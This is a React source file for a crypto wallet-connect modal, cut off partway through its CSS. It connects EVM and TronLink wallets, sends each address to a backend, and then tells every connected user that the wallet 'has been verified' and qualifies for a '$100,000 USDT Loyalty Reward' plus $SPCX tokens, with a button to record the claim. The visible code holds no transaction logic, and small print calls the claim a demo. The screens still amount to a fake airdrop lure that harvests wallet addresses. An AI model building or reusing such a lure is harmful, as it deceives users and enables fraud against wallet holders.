import { useConnect, useAccount } from 'wagmi'
import { useEffect, useMemo, useState } from 'react'
import {
  ArrowLeft,
  Check,
  ChevronRight,
  Gift,
  Grid2X2,
  LoaderCircle,
  Search,
  ShieldCheck,
  X,
} from 'lucide-react'

/*
 * WalletModal.jsx
 *
 * Single unified wallet picker for EVM + TRON.
 * - Dark, 3-column "All Wallets" style UI.
 * - Wallet logos with safe fallbacks.
 * - Detects injected EVM wallets and TronLink.
 * - Uses the selected EVM provider when possible instead of blindly
 *   using window.ethereum.
 * - Shows a spinner while the selected wallet is actually being requested.
 * - Does not move to the reward screen until a real connection succeeds.
 * - Claim flow is explicitly a demo/recording flow unless your backend
 *   confirms a real claim. No fake blockchain transaction is shown.
 */

/* -------------------------------------------------------------------------- */
/* Wallet logos                                                               */
/* -------------------------------------------------------------------------- */

const LOGOS = {
  walletconnect:
    'https://avatars.githubusercontent.com/u/37784886?s=200&v=4',
  okx:
    'https://web3.okx.com/cdn/assets/imgs/247/58E63AA3B7E690A4.png',
  metamask:
    'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg',
  trust:
    'https://trustwallet.com/assets/images/media/assets/trust_platform.svg',
  binance:
    'https://bin.bnbstatic.com/image/admin_mgs_image_upload/20201110/87496d50-2408-43e1-ad4c-78b47b448a6a.png',
  bitget:
    'https://img.bitgetimg.com/image/third=20230410/1681116062743.png',
  rabby:
    'https://rabby.io/assets/images/logo.svg',
  tronlink:
    'https://www.tronlink.org/img/logo.png',
  zypto:
    'https://zypto.com/wp-content/uploads/2023/01/zypto-icon.png',
  frontier:
    'https://www.frontier.xyz/favicon.ico',
  safepal:
    'https://s.safepal.com/file/2022/02/19/safepal-logo.png',
  uniswap:
    'https://cdn.iconscout.com/icon/free/png-256/free-uniswap-logo-icon-download-in-svg-png-gif-file-formats--cryptocurrency-pack-logos-icons-6505428.png',
  ledger:
    'https://cdn1.iconfinder.com/data/icons/cryptocurrency-vol-3/512/ledger-512.png',
  zerion:
    'https://zerion.io/apple-touch-icon.png',
  crypto:
    'https://crypto.com/price/coin-data/icon/CRO/color_icon.png',
  bifrost:
    'https://bifrostwallet.com/img/logo.png',
  imtoken:
    'https://token.im/img/logo.png',
  exodus:
    'https://www.exodus.com/img/logos/exodus-logo-icon.svg',
  rainbow:
    'https://rainbow.me/favicon.ico',
  utila:
    'https://utila.io/favicon.ico',
}

const FALLBACK_COLORS = {
  walletconnect: '#3b82f6',
  okx: '#050505',
  metamask: '#f6851b',
  trust: '#3375bb',
  binance: '#f0b90b',
  bitget: '#18b9e8',
  rabby: '#665dff',
  tronlink: '#ef3340',
  zypto: '#5ce6b0',
  frontier: '#f58a4b',
  safepal: '#6848ef',
  uniswap: '#ff5cac',
  ledger: '#151718',
  zerion: '#4384f4',
  crypto: '#2552b8',
  bifrost: '#3a63d7',
  imtoken: '#31c8df',
  exodus: '#6442bd',
  rainbow: '#2b4b96',
  utila: '#1a1d1f',
}

const LIGHT_LOGO_TEXT = new Set([
  'trust',
  'binance',
  'uniswap',
  'zypto',
])

/* -------------------------------------------------------------------------- */
/* Wallet catalog                                                             */
/* -------------------------------------------------------------------------- */

const mainWallets = [
  { id: 'walletconnect', name: 'WalletConnect', type: 'evm' },
  { id: 'okx', name: 'OKX Wallet', type: 'evm' },
  { id: 'metamask', name: 'MetaMask', type: 'evm' },
  { id: 'trust', name: 'Trust Wallet', type: 'evm' },
  { id: 'binance', name: 'Binance Wallet', type: 'evm' },
  { id: 'bitget', name: 'Bitget Wallet', type: 'evm' },
  { id: 'rabby', name: 'Rabby Wallet', type: 'evm' },
]

const allWallets = [
  ...mainWallets,
  { id: 'tronlink', name: 'TronLink', type: 'tron' },
  { id: 'zypto', name: 'Zypto Wallet', type: 'evm' },
  { id: 'frontier', name: 'Frontier', type: 'evm' },
  { id: 'safepal', name: 'SafePal', type: 'evm' },
  { id: 'uniswap', name: 'Uniswap Wallet', type: 'evm' },
  { id: 'ledger', name: 'Ledger Live', type: 'evm' },
  { id: 'zerion', name: 'Zerion', type: 'evm' },
  { id: 'crypto', name: 'Crypto.com Onchain', type: 'evm' },
  { id: 'bifrost', name: 'Bifrost Wallet', type: 'evm' },
  { id: 'imtoken', name: 'imToken', type: 'evm' },
  { id: 'exodus', name: 'Exodus', type: 'evm' },
  { id: 'rainbow', name: 'Rainbow', type: 'evm' },
  { id: 'utila', name: 'Utila Wallet', type: 'evm' },
]

/* -------------------------------------------------------------------------- */
/* Provider detection                                                         */
/* -------------------------------------------------------------------------- */

function getEthereumProviders() {
  if (typeof window === 'undefined') return []

  const eth = window.ethereum
  if (!eth) return []

  const providers = Array.isArray(eth.providers)
    ? eth.providers
    : [eth]

  return providers.filter(Boolean)
}

function identifyEvmProvider(provider) {
  if (!provider) return []

  const ids = []

  if (provider.isMetaMask && !provider.isBraveWallet) {
    ids.push('metamask')
  }

  if (provider.isTrust || provider.isTrustWallet) {
    ids.push('trust')
  }

  if (provider.isOKExWallet || provider.isOkxWallet) {
    ids.push('okx')
  }

  if (provider.isBitKeep || provider.isBitget) {
    ids.push('bitget')
  }

  if (provider.isRabby) {
    ids.push('rabby')
  }

  if (provider.isBinance || provider.isBinanceW3WSDK) {
    ids.push('binance')
  }

  if (provider.isZerion) {
    ids.push('zerion')
  }

  if (provider.isExodus) {
    ids.push('exodus')
  }

  if (provider.isRainbow) {
    ids.push('rainbow')
  }

  if (provider.isFrontier) {
    ids.push('frontier')
  }

  return ids
}

function detectInstalledWallets() {
  const installed = new Set()

  getEthereumProviders().forEach((provider) => {
    identifyEvmProvider(provider).forEach((id) => installed.add(id))
  })

  if (
    typeof window !== 'undefined' &&
    (window.tronWeb?.ready ||
      window.tronLink ||
      window.tronLink?.ready)
  ) {
    installed.add('tronlink')
  }

  return installed
}

function getProviderForWallet(walletId) {
  const providers = getEthereumProviders()

  for (const provider of providers) {
    if (identifyEvmProvider(provider).includes(walletId)) {
      return provider
    }
  }

  // Generic injected provider fallback.
  // This is intentionally only used when there is one injected provider.
  if (providers.length === 1) {
    return providers[0]
  }

  return null
}

/* -------------------------------------------------------------------------- */
/* Helpers                                                                    */
/* -------------------------------------------------------------------------- */

function shortenAddress(address) {
  if (!address) return ''
  return `${address.slice(0, 6)}…${address.slice(-4)}`
}

function getFriendlyError(error) {
  const code = error?.code

  if (code === 4001 || code === '4001') {
    return 'Connection was cancelled in the wallet.'
  }

  if (code === -32002) {
    return 'A wallet request is already pending. Open your wallet and finish it.'
  }

  const message = String(error?.message || '').toLowerCase()

  if (message.includes('user rejected')) {
    return 'Connection was cancelled in the wallet.'
  }

  if (message.includes('already pending')) {
    return 'A wallet request is already pending. Open your wallet and finish it.'
  }

  return error?.message || 'Connection could not be completed.'
}

/* -------------------------------------------------------------------------- */
/* Wallet icon                                                                */
/* -------------------------------------------------------------------------- */

function WalletIcon({ wallet, size = 54 }) {
  const [imgFailed, setImgFailed] = useState(false)
  const logo = LOGOS[wallet.id]

  const background =
    !logo || imgFailed
      ? FALLBACK_COLORS[wallet.id] || '#1f2937'
      : '#171717'

  const textColor = LIGHT_LOGO_TEXT.has(wallet.id) ? '#0a0a0a' : '#fff'

  return (
    <span
      className="wm-wallet-icon"
      style={{
        width: size,
        height: size,
        borderRadius: size <= 40 ? 10 : 13,
        background,
        color: textColor,
        fontSize: Math.max(13, size * 0.38),
      }}
    >
      {logo && !imgFailed ? (
        <img
          src={logo}
          alt=""
          aria-hidden="true"
          onError={() => setImgFailed(true)}
        />
      ) : (
        wallet.name.charAt(0).toUpperCase()
      )}
    </span>
  )
}

/* -------------------------------------------------------------------------- */
/* Reward screen                                                              */
/* -------------------------------------------------------------------------- */

function ClaimReady({ address, onClaim, claimBusy }) {
  return (
    <div className="wm-view wm-ready-view">
      <div className="wm-connected-box">
        <div className="wm-connected-check">
          <Check size={17} strokeWidth={3} />
        </div>

        <div className="wm-connected-copy">
          <div className="wm-mini-label">Connected Wallet</div>
          <div className="wm-connected-address">
            {shortenAddress(address) || 'Connected'}
          </div>
        </div>

        <ShieldCheck size={19} className="wm-green-icon" />
      </div>

      <div className="wm-eligible">
        <div className="wm-eligible-icon">
          <Gift size={24} />
        </div>

        <h3>You&apos;re Eligible</h3>

        <p>
          Your wallet has been verified. Your reward is ready to be recorded.
        </p>
      </div>

      <div className="wm-reward-card">
        <div className="wm-reward-label">Your Reward</div>

        <div className="wm-reward-amount">$100,000</div>

        <div className="wm-reward-name">USDT Loyalty Reward</div>

        <div className="wm-reward-divider" />

        <div className="wm-reward-meta">
          <span>+ 2,500 $SPCX Tokens</span>
          <span>Network: Multi-chain</span>
        </div>
      </div>

      <button
        type="button"
        className="wm-claim-button"
        onClick={onClaim}
        disabled={claimBusy}
      >
        {claimBusy ? (
          <>
            <LoaderCircle size={17} className="wm-spin" />
            Recording claim…
          </>
        ) : (
          'Record $100,000 USDT Reward'
        )}
      </button>

      <p className="wm-demo-note">
        Demo claim: no smart-contract transaction is submitted.
      </p>
    </div>
  )
}

/* -------------------------------------------------------------------------- */
/* Success screen                                                             */
/* -------------------------------------------------------------------------- */

function SuccessScreen({ onClose }) {
  useEffect(() => {
    const timer = setTimeout(() => onClose(), 2500)
    return () => clearTimeout(timer)
  }, [onClose])

  return (
    <div className="wm-success">
      <div className="wm-success-check">
        <Check size={31} strokeWidth={3} />
      </div>

      <h3>Claim Recorded</h3>

      <p>$100,000 USDT + 2,500 $SPCX</p>

      <small>
        Demo claim recorded. No blockchain transaction was submitted.
      </small>

      <div className="wm-return">
        Returning to platform…
      </div>
    </div>
  )
}

/* -------------------------------------------------------------------------- */
/* Main modal                                                                 */
/* -------------------------------------------------------------------------- */

export default function WalletModal({ isOpen, onClose }) {
  const { connect, connectors } = useConnect()
  const { address: wagmiAddress } = useAccount()

  const [view, setView] = useState('main')
  const [query, setQuery] = useState('')
  const [busyId, setBusyId] = useState(null)
  const [error, setError] = useState('')
  const [connectedAddr, setConnectedAddr] = useState('')
  const [installed, setInstalled] = useState(() => new Set())
  const [claimBusy, setClaimBusy] = useState(false)

  /* ---------------------------------------------------------------------- */
  /* Wallet detection                                                       */
  /* ---------------------------------------------------------------------- */

  const refreshInstalled = () => {
    setInstalled(detectInstalledWallets())
  }

  useEffect(() => {
    if (typeof window === 'undefined') return undefined

    const timer = setTimeout(refreshInstalled, 450)

    return () => clearTimeout(timer)
  }, [])

  useEffect(() => {
    if (!isOpen) return undefined

    setView('main')
    setQuery('')
    setError('')
    setBusyId(null)
    setClaimBusy(false)

    const timer = setTimeout(refreshInstalled, 250)

    return () => clearTimeout(timer)
  }, [isOpen])

  /* ---------------------------------------------------------------------- */
  /* Keyboard handling                                                      */
  /* ---------------------------------------------------------------------- */

  useEffect(() => {
    if (!isOpen) return undefined

    const handleKeyDown = (event) => {
      if (event.key === 'Escape' && !busyId && !claimBusy) {
        onClose()
      }
    }

    window.addEventListener('keydown', handleKeyDown)

    return () => window.removeEventListener('keydown', handleKeyDown)
  }, [isOpen, busyId, claimBusy, onClose])

  /* ---------------------------------------------------------------------- */
  /* Search                                                                 */
  /* ---------------------------------------------------------------------- */

  const filteredWallets = useMemo(() => {
    const normalized = query.trim().toLowerCase()

    if (!normalized) return allWallets

    return allWallets.filter((wallet) =>
      wallet.name.toLowerCase().includes(normalized)
    )
  }, [query])

  /* ---------------------------------------------------------------------- */
  /* Backend session                                                        */
  /* ---------------------------------------------------------------------- */

  async function registerConnectedWallet(address, chain) {
    try {
      const apiUrl = import.meta.env.VITE_API_URL

      if (!apiUrl) return

      const response = await fetch(`${apiUrl}/api/wallet/connect`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          address,
          chain,
        }),
      })

      if (!response.ok) {
        throw new Error(`Wallet registration failed (${response.status}).`)
      }

      const data = await response.json()

      if (data?.token) {
        sessionStorage.setItem('spcx_token', data.token)
      }
    } catch (backendError) {
      /*
       * The wallet itself has already connected successfully.
       * Backend registration should not make the UI claim that the wallet
       * failed. Log the issue and continue.
       */
      console.error('Wallet registration error:', backendError)
    }
  }

  /* ---------------------------------------------------------------------- */
  /* EVM connector lookup                                                   */
  /* ---------------------------------------------------------------------- */

  function getWagmiConnector(walletId) {
    const list = Array.isArray(connectors) ? connectors : []

    if (!list.length) return null

    const normalized = walletId.toLowerCase()

    const exact = list.find((connector) => {
      const id = String(connector.id || '').toLowerCase()
      const name = String(connector.name || '').toLowerCase()

      if (normalized === 'walletconnect') {
        return (
          id.includes('walletconnect') ||
          name.includes('walletconnect')
        )
      }

      if (normalized === 'metamask') {
        return id.includes('meta') || name.includes('meta')
      }

      if (normalized === 'okx') {
        return id.includes('okx') || name.includes('okx')
      }

      if (normalized === 'trust') {
        return id.includes('trust') || name.includes('trust')
      }

      if (normalized === 'binance') {
        return id.includes('binance') || name.includes('binance')
      }

      if (normalized === 'bitget') {
        return (
          id.includes('bitget') ||
          id.includes('bitkeep') ||
          name.includes('bitget')
        )
      }

      if (normalized === 'rabby') {
        return id.includes('rabby') || name.includes('rabby')
      }

      return false
    })

    return exact || null
  }

  /* ---------------------------------------------------------------------- */
  /* Connect wallet                                                         */
  /* ---------------------------------------------------------------------- */

  async function connectWallet(wallet) {
    if (busyId || claimBusy) return

    setError('')
    setBusyId(wallet.id)

    try {
      /* -------------------------------------------------------------- */
      /* TRON                                                            */
      /* -------------------------------------------------------------- */

      if (wallet.id === 'tronlink') {
        if (typeof window === 'undefined') {
          throw new Error('Browser wallet access is unavailable.')
        }

        const tronLink = window.tronLink
        const tronWeb = window.tronWeb

        if (!tronLink && !tronWeb) {
          throw new Error(
            'TronLink is not installed. Install TronLink and try again.'
          )
        }

        /*
         * Ask TronLink to authorize/connect if the extension exposes
         * the request API. This prevents us from treating an injected
         * object as proof of connection.
         */
        if (tronLink?.request) {
          try {
            await tronLink.request({
              method: 'tron_requestAccounts',
            })
          } catch (requestError) {
            throw requestError
          }
        }

        const activeTronWeb = window.tronWeb
        const tronReady = Boolean(activeTronWeb?.ready)
        const tronAddress =
          activeTronWeb?.defaultAddress?.base58 ||
          window.tronLink?.tronWeb?.defaultAddress?.base58 ||
          ''

        if (!tronReady || !tronAddress) {
          throw new Error(
            'TronLink opened, but no connected TRON account was returned.'
          )
        }

        await registerConnectedWallet(tronAddress, 'tron')

        setConnectedAddr(tronAddress)
        setView('ready')
        return
      }

      /* -------------------------------------------------------------- */
      /* WalletConnect                                                   */
      /* -------------------------------------------------------------- */

      if (wallet.id === 'walletconnect') {
        const connector = getWagmiConnector('walletconnect')

        if (!connector) {
          throw new Error(
            'WalletConnect is not configured in the current wagmi setup.'
          )
        }

        const result = await connect({ connector })

        const addr =
          result?.accounts?.[0] ||
          result?.account ||
          ''

        if (!addr) {
          throw new Error(
            'WalletConnect completed without returning an account.'
          )
        }

        const chainId =
          result?.chainId ||
          connector?.chains?.[0]?.id ||
          1

        await registerConnectedWallet(addr, String(chainId))

        setConnectedAddr(addr)
        setView('ready')
        return
      }

      /* -------------------------------------------------------------- */
      /* Injected EVM wallets                                            */
      /* -------------------------------------------------------------- */

      const provider = getProviderForWallet(wallet.id)

      if (!provider) {
        const connector = getWagmiConnector(wallet.id)

        if (connector) {
          const result = await connect({ connector })

          const addr =
            result?.accounts?.[0] ||
            result?.account ||
            wagmiAddress ||
            ''

          if (!addr) {
            throw new Error(
              'The wallet did not return a connected account.'
            )
          }

          const chainId =
            result?.chainId ||
            connector?.chains?.[0]?.id ||
            1

          await registerConnectedWallet(addr, String(chainId))

          setConnectedAddr(addr)
          setView('ready')
          return
        }

        throw new Error(
          `${wallet.name} is not detected. Install the wallet extension or use its supported connection method.`
        )
      }

      /*
       * IMPORTANT:
       * Request accounts from the selected provider itself.
       * This avoids the old behaviour where every wallet click could
       * accidentally call whichever provider happened to be assigned
       * to window.ethereum.
       */
      const accounts = await provider.request({
        method: 'eth_requestAccounts',
      })

      const addr = accounts?.[0]

      if (!addr) {
        throw new Error(
          `${wallet.name} did not return an account.`
        )
      }

      let chainId = '1'

      try {
        chainId = await provider.request({
          method: 'eth_chainId',
        })
      } catch {
        chainId = '1'
      }

      /*
       * Keep wagmi state synchronized when a matching connector exists.
       * The selected provider connection above is the source of truth
       * for this modal's immediate connection result.
       */
      const connector = getWagmiConnector(wallet.id)

      if (connector) {
        try {
          await connect({ connector })
        } catch (wagmiError) {
          /*
           * The provider already returned an account. A wagmi sync failure
           * should not turn a successful wallet connection into a fake
           * "not connected" state.
           */
          console.warn('wagmi synchronization warning:', wagmiError)
        }
      }

      await registerConnectedWallet(addr, String(chainId))

      setConnectedAddr(addr)
      setView('ready')
    } catch (connectionError) {
      console.error('Wallet connection error:', connectionError)
      setError(getFriendlyError(connectionError))
    } finally {
      setBusyId(null)
      refreshInstalled()
    }
  }

  /* ---------------------------------------------------------------------- */
  /* Demo claim                                                             */
  /* ---------------------------------------------------------------------- */

  async function handleClaim() {
    if (claimBusy) return

    setClaimBusy(true)
    setError('')

    /*
     * This is intentionally a demo/recording action.
     *
     * If your backend has a legitimate claim-recording endpoint, we call
     * it here. The UI never says a blockchain transfer happened merely
     * because the HTTP request returned.
     */
    try {
      const apiUrl = import.meta.env.VITE_API_URL
      const token = sessionStorage.getItem('spcx_token')

      if (apiUrl && token) {
        const response = await fetch(`${apiUrl}/api/claim/submit`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${token}`,
          },
          body: JSON.stringify({
            demo: true,
            address: connectedAddr || wagmiAddress || '',
          }),
        })

        if (!response.ok) {
          console.warn(
            `Claim-record endpoint returned ${response.status}.`
          )
        }
      }
    } catch (claimError) {
      console.warn('Claim recording request failed:', claimError)
    } finally {
      setClaimBusy(false)
      setView('success')
    }
  }

  /* ---------------------------------------------------------------------- */
  /* Navigation                                                             */
  /* ---------------------------------------------------------------------- */

  const displayAddress = connectedAddr || wagmiAddress || ''

  function goBack() {
    if (busyId || claimBusy) return

    setError('')

    if (view === 'all') {
      setView('main')
      return
    }

    if (view === 'ready') {
      setView('main')
      setConnectedAddr('')
      return
    }

    onClose()
  }

  const titles = {
    main: 'Connect Wallet',
    all: 'All Wallets',
    ready: 'Claim Your Reward',
    success: 'Claim Recorded',
  }

  if (!isOpen) return null

  return (
    <>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Space+Grotesk:wght@500;600;700&display=swap');

        .wm-backdrop {
          position: fixed;
          inset: 0;
          z-index: 9999;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 20px;
          background: rgba(0, 0, 0, .76);
          backdrop-filter: blur(8px);
          -webkit-backdrop-filter: blur(8px);
          font-family: 'DM Sans', sans-serif;
        }

        .wm-panel {
          width: min(430px, 100%);
          max-height: min(720px, calc(100vh - 40px));
          display: flex;
          flex-direction: column;
          overflow: hidden;
          background: #101212;
          border: 1px solid rgba(255,255,255,.075);
          border-radius: 22px;
          box-shadow:
            0 30px 90px rgba(0,0,0,.65),
            0 0 0 1px rgba(0,0,0,.45);
          animation: wmPanelIn .32s cubic-bezier(.22,1,.36,1) both;
        }

        @keyframes wmPanelIn {
          from {
            opacity: 0;
            transform: translateY(14px) scale(.97);
          }
          to {
            opacity: 1;
            transform: translateY(0) scale(1);
          }
        }

        .wm-header {
          min-height: 62px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          padding: 0 17px;
          border-bottom: 1px solid rgba(255,255,255,.055);
          flex-shrink: 0;
        }

        .wm-heading {
          min-width: 0;
          display: flex;
          align-items: center;
          gap: 9px;
        }

        .wm-title {
          margin: 0;
          color: #f2f3f3;
          font-family: 'Space Grotesk', sans-serif;
          font-size: 17px;
          font-weight: 600;
          letter-spacing: -.025em;
        }

        .wm-icon-btn {
          width: 32px;
          height: 32px;
          display: inline-flex;
          align-items: center;
          justify-content: center;
          padding: 0;
          border: 0;
          border-radius: 9px;
          color: #85888a;
          background: transparent;
          cursor: pointer;
          transition:
            color .2s ease,
            background .2s ease,
            transform .2s ease;
        }

        .wm-icon-btn:hover {
          color: #fff;
          background: rgba(255,255,255,.055);
        }

        .wm-close-btn:hover {
          transform: rotate(90deg);
        }

        .wm-body {
          flex: 1;
          min-height: 0;
          overflow-y: auto;
          scrollbar-width: thin;
          scrollbar-color: #282b2c transparent;
        }

        .wm-body::-webkit-scrollbar {
          width: 5px;
        }

        .wm-body::-webkit-scrollbar-thumb {
          background: #282b2c;
          border-radius: 5px;
        }

        .wm-view {
          animation: wmViewIn .28s cubic-bezier(.22,1,.36,1) both;
        }

        @keyframes wmViewIn {
          from {
            opacity: 0;
            transform: translateY(7px);
          }
          to {
            opacity: 1;
            transform: translateY(0);
          }
        }

        /* Main view */

        .wm-main-intro {
          padding: 17px 18px 9px;
        }

        .wm-main-intro p {
          margin: 0;
          color: #767a7c;
          font-size: 12px;
          line-height: 1.45;
        }

        .wm-grid {
          display: grid;
          grid-template-columns: repeat(3, minmax(0, 1fr));
          gap: 7px;
          padding: 8px 17px 12px;
        }

        .wm-card {
          position: relative;
          min-width: 0;
          min-height: 103px;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          gap: 8px;
          padding: 10px 5px;
          border: 1px solid transparent;
          border-radius: 12px;
          background: #151717;
          color: #aaaeb0;
          font-family: 'DM Sans', sans-serif;
          font-size: 10.5px;
          font-weight: 500;
          line-height: 1.15;
          text-align: center;
          cursor: pointer;
          transition:
            background .2s ease,
            border-color .2s ease,
            transform .2s ease;
        }

        .wm-card:hover:not(:disabled) {
          background: #1b1e1f;
          border-color: rgba(255,255,255,.075);
          transform: translateY(-2px);
        }

        .wm-card:disabled {
          cursor: wait;
        }

        .wm-card-name {
          max-width: 100%;
          overflow: hidden;
          text-overflow: ellipsis;
          white-space: nowrap;
          padding: 0 2px;
        }

        .wm-card-wrap {
          position: relative;
          display: inline-flex;
        }

        .wm-card-spinner {
          position: absolute;
          inset: -1px;
          display: flex;
          align-items: center;
          justify-content: center;
          border-radius: 13px;
          background: rgba(0,0,0,.62);
        }

        .wm-card-spinner svg {
          filter: drop-shadow(0 1px 4px rgba(0,0,0,.6));
        }

        .wm-installed-dot {
          position: absolute;
          right: -3px;
          bottom: -3px;
          width: 13px;
          height: 13px;
          display: flex;
          align-items: center;
          justify-content: center;
          border: 2px solid #151717;
          border-radius: 50%;
          background: #65d98d;
          color: #06140a;
        }

        .wm-installed-dot svg {
          width: 8px;
          height: 8px;
          stroke-width: 4;
        }

        .wm-all-button {
          width: calc(100% - 34px);
          min-height: 57px;
          display: flex;
          align-items: center;
          gap: 12px;
          margin: 2px 17px 14px;
          padding: 8px 10px;
          border: 1px solid rgba(255,255,255,.055);
          border-radius: 12px;
          background: #151717;
          color: #e8eaea;
          cursor: pointer;
          font-family: 'DM Sans', sans-serif;
          text-align: left;
          transition:
            background .2s ease,
            border-color .2s ease;
        }

        .wm-all-button:hover {
          background: #1a1d1e;
          border-color: rgba(255,255,255,.09);
        }

        .wm-all-icon {
          width: 40px;
          height: 40px;
          flex: 0 0 auto;
          display: inline-flex;
          align-items: center;
          justify-content: center;
          border-radius: 10px;
          background: #202324;
          color: #9a9d9f;
        }

        .wm-all-copy {
          flex: 1;
          min-width: 0;
        }

        .wm-all-label {
          display: block;
          font-size: 13px;
          font-weight: 600;
        }

        .wm-all-subtitle {
          display: block;
          margin-top: 2px;
          color: #626668;
          font-size: 10px;
        }

        .wm-badge {
          padding: 5px 7px;
          border-radius: 6px;
          background: #202324;
          color: #747879;
          font-size: 10px;
          font-weight: 700;
        }

        .wm-main-note,
        .wm-note {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 6px;
          padding: 0 17px 17px;
          color: #55595b;
          font-size: 10.5px;
          line-height: 1.4;
          text-align: center;
        }

        /* All wallets */

        .wm-search {
          display: flex;
          align-items: center;
          gap: 9px;
          margin: 14px 17px 10px;
          padding: 10px 12px;
          border: 1px solid transparent;
          border-radius: 10px;
          background: #181a1b;
          color: #686c6e;
          transition:
            border-color .2s ease,
            background .2s ease;
        }

        .wm-search:focus-within {
          border-color: rgba(255,255,255,.13);
          background: #1c1f20;
        }

        .wm-search input {
          width: 100%;
          min-width: 0;
          outline: none;
          border: 0;
          background: transparent;
          color: #f1f2f2;
          font-family: 'DM Sans', sans-serif;
          font-size: 13px;
        }

        .wm-search input::placeholder {
          color: #5c6062;
        }

        .wm-all-grid {
          padding-top: 4px;
          padding-bottom: 18px;
        }

        .wm-all-status {
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 7px;
          margin: 0 17px 14px;
          padding: 9px 11px;
          border-radius: 9px;
          background: #171d18;
          color: #8ecb9d;
          font-size: 10.5px;
        }

        .wm-error {
          display: flex;
          align-items: flex-start;
          gap: 8px;
          margin: 0 17px 14px;
          padding: 10px 11px;
          border: 1px solid rgba(255,92,92,.08);
          border-radius: 9px;
          background: #25191a;
          color: #ffaaaa;
          font-size: 10.5px;
          line-height: 1.45;
        }

        .wm-empty {
          padding: 32px 20px;
          color: #696d6f;
          font-size: 12px;
          text-align: center;
        }

        /* Icons */

        .wm-wallet-icon {
          position: relative;
          display: inline-flex;
          align-items: center;
          justify-content: center;
          flex: 0 0 auto;
          overflow: hidden;
          border: 1px solid rgba(255,255,255,.08);
          font-family: 'Space Grotesk', sans-serif;
          font-weight: 700;
          user-select: none;
        }

        .wm-wallet-icon img {
          width: 100%;
          height: 100%;
          padding: 7%;
          object-fit: contain;
        }

        .wm-spin {
          animation: wmSpin .9s linear infinite;
        }

        @keyframes wmSpin {
          to {
            transform: rotate(360deg);
          }
        }

        /* Ready */

        .wm-ready-view {
          padding: 17px;
        }

        .wm-connected-box {
          display: flex;
          align-items: center;
          gap: 10px;
          padding: 11px;
          border: 1px solid #23472e;
          border-radius: 12px;
          background: #0c100d;
        }

        .wm-connected-check {
          width: 31px;
          height: 31px;
          flex: 0 0 auto;
          display: inline-flex;
          align-items: center;
          justify-content: center;
          border: 1px solid #315f3c;
          border-radius: 50%;
          background: #17261a;
          color: #6de397;
        }

        .wm-connected-copy {
          flex: 1;
          min-width: 0;
        }

        .wm-mini-label {
          margin-bottom: 2px;
          color: #6d7370;
          font-size: 9px;
        }

        .wm-connected-address {
          color: #edf0ee;
          font-size: 12.5px;
          font-weight: 600;
        }

        .wm-green-icon {
          color: #6de397;
        }

        .wm-eligible {
          padding: 22px 7px 18px;
          text-align: center;
        }

        .wm-eligible-icon {
          width: 51px;
          height: 51px;
          display: inline-flex;
          align-items: center;
          justify-content: center;
          margin-bottom: 11px;
          border: 1px solid #315f3c;
          border-radius: 50%;
          background: #17261a;
          color: #6de397;
        }

        .wm-eligible h3 {
          margin: 0 0 5px;
          color: #f0f2f1;
          font-family: 'Space Grotesk', sans-serif;
          font-size: 19px;
          font-weight: 700;
        }

        .wm-eligible p {
          max-width: 310px;
          margin: 0 auto;
          color: #727776;
          font-size: 11.5px;
          line-height: 1.5;
        }

        .wm-reward-card {
          margin-bottom: 12px;
          padding: 17px;
          border: 1px solid rgba(255,255,255,.075);
          border-radius: 14px;
          background: linear-gradient(135deg, #202c65 0%, #211f49 100%);
        }

        .wm-reward-label {
          margin-bottom: 5px;
          color: rgba(255,255,255,.52);
          font-size: 9px;
          font-weight: 600;
          letter-spacing: .14em;
          text-transform: uppercase;
        }

        .wm-reward-amount {
          color: #fff;
          font-family: 'Space Grotesk', sans-serif;
          font-size: 33px;
          font-weight: 700;
          line-height: 1;
          letter-spacing: -.04em;
        }

        .wm-reward-name {
          margin-top: 5px;
          color: rgba(255,255,255,.62);
          font-size: 12px;
        }

        .wm-reward-divider {
          height: 1px;
          margin: 14px 0 10px;
          background: rgba(255,255,255,.1);
        }

        .wm-reward-meta {
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 10px;
          color: rgba(255,255,255,.55);
          font-size: 10px;
        }

        .wm-claim-button {
          width: 100%;
          min-height: 47px;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 8px;
          border: 0;
          border-radius: 10px;
          background: #f1f2f2;
          color: #0b0d0d;
          cursor: pointer;
          font-family: 'Space Grotesk', sans-serif;
          font-size: 12.5px;
          font-weight: 700;
          transition:
            background .2s ease,
            transform .2s ease;
        }

        .wm-claim-button:hover:not(:disabled) {
          background: #fff;
          transform: translateY(-1px);
        }

        .wm-claim-button:disabled {
          cursor: wait;
          opacity: .72;
        }

        .wm-demo-note {
          margin: 9px 0 0;
          color: #55595a;
          font-size: 9.5px;
          line-height: 1.45;
          text-align: center;
        }

        /* Success */

        .wm-success {
          padding: 52px 26px 42px;
          text-align: center;
          animation: wmViewIn .28s cubic-bezier(.22,1,.36,1) both;
        }

        .wm-success-check {
          width: 68px;
          height: 68px;
          display: inline-flex;
          align-items: center;
          justify-content: center;
          margin-bottom: 16px;
          border: 1px solid #315f3c;
          border-radius: 50%;
          background: #17261a;
          color: #6de397;
          animation: wmPop .45s cubic-bezier(.22,1.5,.36,1) both;
        }

        @keyframes wmPop {
          from {
            opacity: 0;
            transform: scale(.55);
          }
          to {
            opacity: 1;
            transform: scale(1);
          }
        }

        .wm-success h3 {
          margin: 0 0 7px;
          color: #f0f2f1;
          font-family: 'Space Grotesk', sans-serif;
          font-size: 21px;
          font-weight: 700;
        }

        .wm-success p {
          margin: 0 0 5px;
          color: #929795;
          font-size: 12px;
        }

        .wm-success small {
          display: block;
          max-width: 280px;
          margin: 0 auto;
          color: #5d6260;
          font-size: 10px;
          line-height: 1.5;
        }

        .wm-return {
          margin-top: 19px;
          color: #555a58;
          font-size: 10.5px;
        }

        @media (max-width: 600px) {
          .wm-backdrop {
            align-items: flex-end;
            padding: 0;
          }

          .wm-panel {
            width: 100%;
            max-height: 91vh;
            border-radius: 21px 21px 0 0;
            animation: wmSheetIn .32s cubic-bezier(.22,1,.36,1) both;
